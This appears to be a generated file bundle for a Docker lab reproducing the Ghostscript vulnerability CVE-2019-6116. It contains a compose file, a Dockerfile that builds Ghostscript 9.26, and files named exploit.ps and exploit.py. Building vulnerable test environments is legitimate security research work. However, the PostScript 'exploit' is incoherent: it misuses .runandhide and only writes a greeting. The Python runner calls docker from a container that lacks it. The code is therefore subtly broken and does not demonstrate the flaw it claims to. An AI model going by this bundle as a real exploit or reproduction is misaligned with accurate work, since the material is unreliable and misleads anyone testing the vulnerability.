{
    "files": [
        {
            "location": "./../../dockers/CVE-2019-6116/custom_no_tool/docker-compose.yml",
            "content": "services:\n  ghostscript:\n    build: ./ghostscript\n    container_name: ghostscript_vulnerable\n    volumes:\n      - ./scripts:/scripts\n    command: [\"gs\", \"-dNOPAUSE\", \"-dBATCH\", \"-sDEVICE=txtwrite\", \"-sOutputFile=/scripts/output.txt\", \"/scripts/exploit.ps\"]\n\n  imagemagick:\n    image: dpokidov/imagemagick:7.0.8-14\n    container_name: imagemagick\n    volumes:\n      - ./scripts:/scripts\n    depends_on:\n      - ghostscript\n\n  python:\n    image: python:3.7-slim\n    container_name: python_script_runner\n    volumes:\n      - ./scripts:/scripts\n    working_dir: /scripts\n    command: [\"python\", \"exploit.py\"]\n    depends_on:\n      - ghostscript\n      - imagemagick\n\nnetworks:\n  default:\n    name: ghostscript_network\n"
        },
        {
            "location": "./../../dockers/CVE-2019-6116/custom_no_tool/ghostscript/Dockerfile",
            "content": "FROM ubuntu:20.04\n\nRUN apt-get update && \\\n    apt-get install -y wget build-essential && \\\n    rm -rf /var/lib/apt/lists/*\n\n# Download and install Ghostscript 9.26\nRUN wget https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs926/ghostscript-9.26.tar.gz && \\\n    tar -xzf ghostscript-9.26.tar.gz && \\\n    cd ghostscript-9.26 && \\\n    ./configure && \\\n    make && \\\n    make install && \\\n    cd .. && \\\n    rm -rf ghostscript-9.26 ghostscript-9.26.tar.gz\n\nCMD [\"gs\", \"-dNOPAUSE\", \"-dBATCH\", \"-sDEVICE=txtwrite\", \"-sOutputFile=/scripts/output.txt\", \"/scripts/exploit.ps\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2019-6116/custom_no_tool/scripts/exploit.ps",
            "content": "%!PS\n(currentfile) (r) file .runandhide\n/OutputFile (output.txt) def\n/OutputStream (OutputFile) (w) file def\n\n% This command will be executed if the vulnerability is present\nsystemdict /quit { null } put\n\n(OutputStream) (w) file dup 0 0 moveto (Hello from Ghostscript exploit!) show pop\nOutputStream closefile\nquit\n"
        },
        {
            "location": "./../../dockers/CVE-2019-6116/custom_no_tool/scripts/exploit.py",
            "content": "import subprocess\n\n# This script attempts to exploit the Ghostscript vulnerability by sending\n# a crafted PostScript file to the Ghostscript service.\n\ndef exploit_ghostscript():\n    try:\n        # Run the exploit script using Ghostscript\n        subprocess.run(['docker', 'exec', 'ghostscript_vulnerable', 'gs', '-dNOPAUSE', '-dBATCH', '-sDEVICE=txtwrite', '-sOutputFile=/scripts/output.txt', '/scripts/exploit.ps'], check=True)\n        \n        # Check the output\n        with open('scripts/output.txt', 'r') as f:\n            print(f.read())\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n\nif __name__ == \"__main__\":\n    exploit_ghostscript()\n"
        },
        {
            "location": "./../../dockers/CVE-2019-6116/custom_no_tool/scripts/.gitkeep",
            "content": ""
        }
    ],
    "directory_tree": "CVE-2019-6116/\n\u2514\u2500\u2500 custom_no_tool\n    \u251c\u2500\u2500 docker-compose.yml\n    \u251c\u2500\u2500 ghostscript\n    \u2502   \u2514\u2500\u2500 Dockerfile\n    \u2514\u2500\u2500 scripts\n        \u251c\u2500\u2500 exploit.ps\n        \u251c\u2500\u2500 exploit.py\n        \u2514\u2500\u2500 .gitkeep"
}